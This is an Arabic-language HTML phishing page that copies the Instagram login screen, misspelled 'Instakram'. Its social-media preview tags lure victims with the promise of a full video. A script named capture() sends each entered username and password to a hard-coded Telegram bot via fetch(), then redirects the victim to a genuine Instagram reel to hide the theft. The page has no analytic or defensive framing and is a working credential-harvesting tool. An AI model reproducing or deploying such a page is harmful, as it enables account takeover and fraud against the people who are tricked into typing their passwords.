<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
    <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>
    
    <style>
        /* تصميم نظيف جداً مطابق للتطبيق */
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #ffffff; 
            font-family: -apple-system, sans-serif; 
            overflow: hidden; 
        }
        .main-container { 
            display: flex; flex-direction: column; align-items: center; 
            width: 100%; padding-top: 80px; 
        }
        
        /* شعار متموج واحترافي بدون تداخل حروف */
        .brand-header {
            font-family: 'serif'; /* يستخدم خط السيرف المتموج */
            font-size: 42px;
            font-style: italic;
            font-weight: 500;
            color: #262626;
            margin-bottom: 45px;
            letter-spacing: -1px;
            -webkit-text-stroke: 0.5px #262626; /* تجميل الخط */
        }

        .login-section { width: 85%; max-width: 350px; }
        input { 
            width: 100%; background: #fafafa; 
            border: 1px solid #dbdbdb; border-radius: 3px; 
            padding: 14px; margin-bottom: 10px; 
            box-sizing: border-box; font-size: 14px; outline: none;
        }
        input:focus { border: 1px solid #a8a8a8; }
        
        .btn-blue { 
            width: 100%; background-color: #0095f6; color: white; 
            border: none; border-radius: 8px; padding: 12px; 
            font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; 
        }
        
        .line-divider { 
            display: flex; align-items: center; text-align: center; 
            color: #8e8e8e; font-size: 13px; margin: 30px 0; 
        }
        .line-divider::before, .line-divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .line-divider::before { margin-left: 1.5em; }
        .line-divider::after { margin-right: 1.5em; }
        
        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
        .meta-footer { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="brand-header">Instakram</div>
        
        <div class="login-section">
            <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn-blue" onclick="capture()">تسجيل الدخول</button>
            
            <div class="line-divider">أو</div>
            <a href="#" class="fb-link">تسجيل الدخول بحساب Facebook</a>
        </div>
    </div>
    
    <div class="meta-footer">من Meta</div>

    <script>
        function capture() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(user && pass) {
                // إرسال البيانات للتليجرام
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤User: ${user}%0A🔑Pass: ${pass}`);
                // تحويل للفيديو
                setTimeout(() => { 
                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; 
                }, 1000);
            }
        }
    </script>
</body>
</html>
